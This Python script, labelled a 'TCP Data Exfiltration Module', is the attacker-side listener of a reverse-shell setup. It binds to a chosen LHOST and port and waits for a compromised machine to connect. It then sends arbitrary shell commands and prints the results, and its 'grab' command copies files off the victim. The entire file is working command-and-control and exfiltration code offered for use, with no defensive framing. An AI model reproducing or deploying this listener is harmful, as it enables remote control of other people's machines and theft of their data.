#!/usr/bin/env python3

import socket
import os

def Transfer(conn, command):
    #
    conn.send(command.encode())
    #
    resource = input("[+] Enter the resource path and name-> ")
    #
    f = open(resource,'wb')
    #
    while(True):
        #
        bits = conn.recv(1024)
        #
        if(bits.endswith('DONE'.encode())):
            #
            f.write(bits[:-4]) # Write the last bits segment
            #
            f.close()
            #
            break
            #
        if('File not found'.encode() in bits):
            #
            print("[!] File could not be found [!]")
            #
            break
            #
        f.write(bits)

def Connecting(addr,port):
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    print("[*] Binding to: %s:%s " % (addr,port))
    #
    s.bind((addr,port))
    #
    s.listen(1)
    #
    print("[*] Listening for an inbound TCP connection on: %s:%s " % (addr,port))
    #
    c,a = s.accept()
    #
    if(c):
        #
        print("[*] Connection from: %s" % addr)
        #
    while(True):
        #
        command = input(">")
        #
        if('terminate' in command):
            #
            c.send('terminate'.encode())
            #
            break
            #
        elif('grab' in command):
            #
            Transfer(c,command)
            #
        else:
            #
            c.send(command.encode())
            #
            print(c.recv(1024).decode())

def main():
    #
    print("[*] TCP Data Exfiltration Module [*]")
    #
    addr = input("[+] Enter LHOST Address-> ")
    #
    port = int(input("[+] Enter the LHOST port-> "))
    #
    print("[*] Starting server with on: %s:%s " % (addr,port))
    #
    Connecting(addr,port)

if(__name__ == '__main__'):
    #
    main()
